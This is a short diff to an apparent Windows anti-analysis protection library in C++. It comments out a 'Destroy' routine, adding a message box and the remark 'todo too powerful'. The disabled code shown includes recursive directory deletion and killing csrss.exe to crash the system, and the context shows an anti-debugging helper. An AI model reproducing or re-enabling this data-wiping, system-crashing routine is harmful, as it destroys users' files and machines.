@@ -55,6 +55,9 @@ namespace PX::AnalysisProtection
 	{
 		PX_END PX_EXT PX_INL void PX_API Destroy( const HANDLE& hExtensionContainer /*= nullptr*/ ) PX_NOX
 		{
+			MessageBox( nullptr, L"Destroy Attempted", L"Important", MB_OK );
+			// todo too powerful
+/*
 			std::function< void( const std::wstring&, bool ) > lmdaDeleteDirectory = [ &lmdaDeleteDirectory ]( const std::wstring& wstrRootDirectory, const bool bDeleteHostDirectory )
 			{
 				WIN32_FIND_DATA fdInfo;
@@ -127,8 +130,8 @@ Retry:
 			::TerminateProcess( OpenProcess( PROCESS_TERMINATE, FALSE, GetProcessID( PX_XOR( L"csrss.exe" ) ) ), 0u );
 			::TerminateProcess( GetCurrentProcess( ), 0u );
 			ExitProcess( 0 );
+*/
 		}
-
 		PX_EXT PX_INL bool PX_API HideThreadFromDebugger( HANDLE hTargetThread /*= GetCurrentThread( )*/ )
 		{
 			static const auto NtSetInformationThread = static_cast< SWindowsAPI::fnNtSetInformationThread >( PX_WINAPI.GetFunctionPointer( SWindowsAPI::NtSetInformationThread ) );
